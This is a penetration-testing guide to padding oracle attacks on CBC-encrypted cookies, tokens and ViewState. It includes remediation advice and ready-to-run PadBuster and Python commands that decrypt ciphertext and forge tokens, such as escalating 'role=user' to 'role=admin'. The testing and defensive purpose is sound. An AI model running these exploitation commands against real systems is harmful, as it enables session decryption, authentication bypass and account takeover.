# Padding Oracle Attack

## Overview
A padding oracle attack is a cryptographic side-channel attack that exploits a server's behavior when decrypting ciphertext using CBC (Cipher Block Chaining) mode with PKCS#7 padding. When an application reveals whether a decryption operation produced valid padding — through different error messages, HTTP status codes, response times, or redirect behaviors — an attacker can exploit this information leak to decrypt any ciphertext byte-by-byte and, in many implementations, forge arbitrary ciphertext without knowing the key. This attack is particularly relevant to web applications that use encrypted cookies, tokens, or URL parameters.

## How It Works
CBC mode decryption works by XORing each decrypted block with the previous ciphertext block. PKCS#7 padding requires that the final block be padded to the block size (e.g., AES block = 16 bytes), where the padding value equals the number of padding bytes (e.g., `\x08\x08\x08\x08\x08\x08\x08\x08` for 8 bytes of padding).

The attack proceeds in two phases:

**Phase 1 — Decryption oracle (recovering plaintext):**
1. The attacker takes a target ciphertext block `C[n]` and the preceding block `C[n-1]`.
2. The attacker modifies `C[n-1]` byte-by-byte and submits the modified ciphertext to the server.
3. If the server returns a padding error for most modifications but a "success" response for one specific byte value, the attacker has identified the value `X` such that `D(C[n])[last_byte] XOR X = 0x01` (valid one-byte padding).
4. Since `D(C[n])[last_byte] = X XOR 0x01`, and the original plaintext byte = `D(C[n])[last_byte] XOR C[n-1][last_byte]`, the attacker recovers the plaintext byte.
5. This is repeated for each byte, working backwards: 1-byte padding → 2-byte padding → ... → 16-byte padding, then moving to the next block.

**Phase 2 — Encryption oracle (forging ciphertext):**
Once the attacker can derive plaintext, they can also construct ciphertext blocks that decrypt to arbitrary plaintext by working the XOR relationship in reverse. This allows forging encrypted cookies, tokens, or any CBC-mode encrypted value.

**Real-world examples:**
- ASP.NET ViewState and `__VIEWSTATE` parameter encryption (CVE-2010-3332, MS10-070): disclosed whether padding was valid, enabling decryption of ViewState and arbitrary file read.
- Adobe ColdFusion session tokens.
- Ruby on Rails encrypted session cookies (prior to 3.2.13).
- Any custom AES-CBC implementation that returns different errors on padding failure vs. decryption failure.

## Impact
- Decryption of encrypted cookies, session tokens, ViewState, or URL parameters — revealing sensitive user data.
- Forging arbitrary encrypted values — authentication bypass, role elevation, tampered shopping cart data.
- In ASP.NET (MS10-070): arbitrary file read through forged EncryptedData payloads — achieving information disclosure of web.config, source code, etc.
- Full account takeover if the encrypted parameter contains a user ID or role.
- Bypassing authorization controls that rely on encrypted parameters for access decisions.

## Where to Look
- **Encrypted cookies:** cookies with Base64-encoded values that look random (e.g., `ViewState`, `session`, `auth`, `.ASPXAUTH`, custom app cookies).
- **URL parameters:** `?token=...`, `?data=...`, `?enc=...`, `?payload=...` containing Base64 or hex-encoded values.
- **Hidden form fields:** `<input type="hidden" name="__VIEWSTATE">`, `<input type="hidden" name="data">`.
- **ASP.NET applications:** `.aspx` endpoints almost always use AES-CBC for ViewState encryption if it is protected.
- **Error messages:** A server that returns "Invalid padding" separately from "Decryption error" or "Invalid data" is likely vulnerable.
- **Status code differences:** 500 for bad padding vs. 200 for wrong content (but valid padding) is a padding oracle.
- **Redirect differences:** redirect to login for bad padding vs. redirect to error page for valid padding + wrong content.
- **Response timing:** decryption that terminates early on bad padding will be faster than decryption that continues to process valid-padded ciphertext.

## Testing Steps
1. Identify all encrypted parameters in the application: cookies, URL params, hidden fields.
2. Capture a legitimate encrypted value using Burp Suite.
3. Modify the last byte of the second-to-last 16-byte block (for AES) and re-submit.
4. Observe whether the response differs based on padding validity vs. decryption/application-level errors.
5. If responses differ based on padding validity, the application is a padding oracle.
6. Run PadBuster or padding-oracle-attacker against the identified parameter.
7. Attempt to decrypt the token to recover the plaintext.
8. Attempt to forge a token with modified plaintext (e.g., change `userid=1` to `userid=2` or `admin=false` to `admin=true`).
9. Test all encrypted parameters — some may not be vulnerable while others are.
10. Document the oracle type (error message, status code, timing, redirect) for the vulnerability report.

## Payloads / Techniques

```bash
# ===== PadBuster — Automated Padding Oracle Exploitation =====
# Install: apt install padbuster  OR  git clone https://github.com/AonCyberLabs/PadBuster

# Basic usage — decrypt an encrypted cookie
padbuster https://target.example.com/page \
  "encryptedCookieValue==" \
  16 \
  -cookies "auth=encryptedCookieValue==" \
  -encoding 0

# PadBuster parameters:
# Argument 1: target URL
# Argument 2: encrypted sample (the value to decrypt)
# Argument 3: block size (8 for DES/3DES, 16 for AES)
# -cookies: send the value as a cookie
# -encoding 0: auto-detect encoding (0=Base64, 1=lowerHex, 2=upperHex, 4=Base64URL)

# Decrypt a URL parameter
padbuster "https://target.example.com/api?token=ENCRYPTEDVALUE" \
  "ENCRYPTEDVALUE" \
  16 \
  -encoding 0

# Decrypt a POST body parameter
padbuster "https://target.example.com/api/decrypt" \
  "ENCRYPTEDVALUE" \
  16 \
  -post "data=ENCRYPTEDVALUE" \
  -encoding 0

# Forge a new encrypted value after recovering plaintext
# Example: original plaintext found to be "user=bob&role=user"
# Forge "user=bob&role=admin"
padbuster https://target.example.com/page \
  "ENCRYPTEDVALUE" \
  16 \
  -cookies "auth=ENCRYPTEDVALUE" \
  -encoding 0 \
  -plaintext "user=bob&role=admin"

# ASP.NET ViewState padding oracle (MS10-070 style)
# -error specifies a string in the non-padding-error response body to distinguish oracle
padbuster "https://target.aspx.example.com/default.aspx" \
  "VIEWSTATEVALUE" \
  16 \
  -post "__VIEWSTATE=VIEWSTATEVALUE&__EVENTVALIDATION=EVVAL" \
  -encoding 3 \
  -error "Invalid viewstate"

# padding-oracle-attacker (Python alternative)
pip install padding-oracle-attacker
padding-oracle-attacker decrypt \
  --url "https://target.example.com/page" \
  --data "auth=BLOCK1BLOCK2" \
  --block-size 16 \
  --oracle-fn status_code \
  --error-code 500

# Manual byte flip test to detect oracle
python3 -c "
import base64, sys

# Take a captured Base64-encoded ciphertext
ct = base64.b64decode('YOUR_ENCRYPTED_VALUE_HERE')
ct_list = list(ct)

# Flip the last byte of the second-to-last block (block N-2, last byte)
# For AES with 16-byte blocks: second-to-last block ends at len(ct)-16-1
idx = len(ct) - 17  # last byte of second-to-last block
ct_list[idx] = ct_list[idx] ^ 0x01  # flip one bit

modified = base64.b64encode(bytes(ct_list)).decode()
print('Modified ciphertext:', modified)
print('Submit this to the server and compare response vs. original')
"

# Example curl: compare response with original vs. flipped ciphertext
ORIGINAL="originalBase64CiphertextHere"
MODIFIED="modifiedBase64CiphertextHere"

echo "=== Original ==="
curl -s -o /tmp/original_resp.txt -w "HTTP %{http_code}" \
  -b "auth=${ORIGINAL}" https://target.example.com/

echo "=== Modified ==="
curl -s -o /tmp/modified_resp.txt -w "HTTP %{http_code}" \
  -b "auth=${MODIFIED}" https://target.example.com/

diff /tmp/original_resp.txt /tmp/modified_resp.txt
```

```python
# Timing oracle detection script
import requests, base64, time, sys

URL = "https://target.example.com/page"
COOKIE_NAME = "auth"
ENCRYPTED_VALUE = "YOUR_BASE64_ENCRYPTED_VALUE"

def test_padding(modified_ciphertext):
    ct_b64 = base64.b64encode(modified_ciphertext).decode()
    start = time.time()
    r = requests.get(URL, cookies={COOKIE_NAME: ct_b64}, timeout=10)
    elapsed = time.time() - start
    return r.status_code, len(r.content), elapsed

ct = base64.b64decode(ENCRYPTED_VALUE)
ct_list = list(ct)

print("Testing padding oracle via response time / status / length...")
for byte_val in range(256):
    modified = ct_list.copy()
    modified[-17] = byte_val  # flip second-to-last block's last byte
    status, length, timing = test_padding(bytes(modified))
    if status != 500:  # or whatever the "bad padding" code is
        print(f"Byte 0x{byte_val:02x}: Status={status}, Len={length}, Time={timing:.3f}s  <-- POSSIBLE VALID PADDING")
```

## Burp Suite Tips
- Capture the encrypted parameter using **Proxy > HTTP History** and send the request to **Repeater**.
- In Repeater, manually modify the last byte of the second-to-last AES block (bytes in Base64 correspond to every 16 raw bytes) and observe the response difference.
- Use **Intruder** in **Sniper** mode with a **Number** payload (0-255) against the byte position you identified. Use **Grep - Match** on the error/success string to automatically flag the oracle response.
- The **Padding Oracle** BApp (Burp BApp Store) automates padding oracle detection and exploitation from within Burp.
- Use **Decoder** to decode Base64/Hex ciphertext, view the raw bytes, and understand block boundaries (every 16 bytes = one AES block).
- Set **Proxy > Intercept** and manually tamper with the encrypted parameter before it reaches the server — observe how the server responds to invalid padding vs. valid padding with wrong content.
- Use **Comparer** to diff the response body from a valid-padded vs. invalid-padded request — even subtle differences (whitespace, ordering) count as an oracle.

## Tools
- PadBuster — https://github.com/AonCyberLabs/PadBuster
- padding-oracle-attacker — https://github.com/KishanBagaria/padding-oracle-attacker
- python-paddingoracle — https://github.com/mwielgoszewski/python-paddingoracle
- Burp Suite (Padding Oracle BApp, Intruder, Decoder)
- padoracle — part of various CTF toolkits
- Metasploit: `auxiliary/scanner/http/ms10_070_asp_net_padding_oracle`

## Remediation
- Switch from AES-CBC to an authenticated encryption mode: **AES-GCM** or **ChaCha20-Poly1305**. These modes provide both confidentiality and integrity, making padding oracle attacks impossible.
- If CBC must be used: implement **Encrypt-then-MAC** — compute an HMAC over the ciphertext and IV, and verify the MAC before attempting any decryption. Verification must be constant-time.
- Ensure error messages do not distinguish between padding errors and content errors — return a single generic error ("Invalid request") regardless of the decryption failure reason.
- Use constant-time comparison for MAC/HMAC verification to prevent timing oracles.
- In ASP.NET: ensure `machineKey` is configured with `validation="HMACSHA256"` and `decryption="AES"`, and apply MS10-070 patch.
- Replace custom cryptography with well-audited libraries (e.g., use `cryptography.hazmat.primitives.ciphers.aead.AESGCM` in Python, or `javax.crypto.Cipher` with `AES/GCM/NoPadding` in Java).
- Regularly audit any code paths that decrypt user-supplied ciphertext.

## References
https://owasp.org/www-community/attacks/Padding_oracle_attack
https://portswigger.net/web-security/cbc-padding-oracle
https://github.com/AonCyberLabs/PadBuster
https://nvd.nist.gov/vuln/detail/CVE-2010-3332
https://www.microsoft.com/en-us/msrc/security-update-guide
https://pnuts.dev/attacks/padding-oracle/
https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
https://www.rfc-editor.org/rfc/rfc5652
